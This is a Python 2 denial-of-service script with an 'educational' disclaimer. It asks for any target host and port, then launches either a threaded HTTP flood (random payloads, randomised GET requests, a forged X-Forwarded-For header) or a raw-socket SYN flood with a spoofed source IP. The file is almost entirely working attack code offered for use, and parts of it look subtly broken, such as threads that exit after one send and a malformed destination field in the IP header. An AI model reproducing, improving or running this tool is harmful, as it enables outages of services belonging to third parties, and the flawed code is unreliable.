# -*- coding: utf-8 -*-
import socket
import random
import threading
import sys
import time
import signal
from requests import *
from struct import *

print("Ddos")

print(                                 

"\n██████╗ ██████╗  ██████╗ ███████╗     █████╗  ██████╗████████╗ █████╗  ██████╗██╗  ██╗"
"\n██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
"\n██║  ██║██║  ██║██║   ██║███████╗    ███████║██║        ██║   ███████║██║     █████╔╝ "
"\n██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██║██║        ██║   ██╔══██║██║     ██╔═██╗ "
"\n██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║╚██████╗   ██║   ██║  ██║╚██████╗██║  ██╗"
"\n╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ " 
"\n                                                          [+] Code by © Gabriel Perez 2022"
"\n                                                              [!] Version: 1.1v Python 2"  

)

print("\n--:Acttack 1 Http flood || Acttack 2 Syn flood:--\n")
host = raw_input("Please introduce the target: ")
port = int(input("Please introduce the port: "))
numreq = int(input("Number of request:"))
ina = int(input("Choose Acttack type: "))


time.sleep(1)
print("\nDisclaimer: This script is for education if you use this to Acttack. I dont Responsible \n")
time.sleep(1)

def sig_handler(sig, frame):
    print("Exiting")
    sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

def attack():

    global sent
    sent = 0
    byt = random._urandom(51200)
    url = '/'
    fake_ip = '182.21.20.32'

    while True:
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            soc.connect((host, port))
            soc.send(byt)

            #soc.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'),(host, port))
            #soc.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(host, port))

            soc.send(str("GET "+url+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+host+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())
            soc.send(str("GET "+url+"?="+str(random.randint(1,210000000))+" HTTP/1.1\r\nHost: "+host+"\r\nConnection: Keep-Alive\r\nX-Forwarded-For: 1.1.1.1\r\n\r\n").encode())

            sent = sent + 1
            print("Acttacking target {} sent {} files".format(host, sent))

        except socket.error as error:

            print(str(error))

        finally:
            sys.exit()
            soc.close()
        
def execute():
    for i in range(numreq):
        thread = threading.Thread(target=attack)
        thread.start()


def checksum(msg):
    s = 0

    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
     
    s = (s>>16) + (s & 0xffff);

    s = ~s & 0xffff
     
    return s


def HeaderSyn():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

    packet = '';

    global source_ip
    global dest_ip
    source_ip = '192.36.78.1'
    dest_ip = host

    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20
    id = random.randint(1, 65535)
    frag_off = 0
    ttl = random.randint(1, 255)
    protocol = socket.IPPROTO_TCP
    check = 10
    saddr = socket.inet_aton (source_ip)
    daddr = host
    ihl_version = (version << 4) + ihl
    global ip_header
    ip_header =  pack('BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

def Tcp():
    HeaderSyn()
    source = random.randint(36000, 65535)
    dest = port
    seq = 0
    ack_seq = 0
    doff = 5
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840)
    check = 0
    urg_ptr = 0
    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = pack("!4s4sBBH", source_address , dest_address , placeholder , protocol , tcp_length);
    psh = psh + tcp_header;
    tcp_checksum = checksum(psh)
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
    global packet

    packet = ip_header + tcp_header


def attackSyn():
    while True:
        try:
            Tcp()
            s.sendto(packet, (dest_ip, 0))

            print("Acttacking target " + host +" sent files")

        except socket.error as error:

            print(error)

        finally:

            sys.exit()


def executesyn():
    for i in range(numreq):
        thread = threading.Thread(target=attackSyn)
        thread.start()


if ina == 1:
    execute()

elif ina == 2:
    executesyn()
    


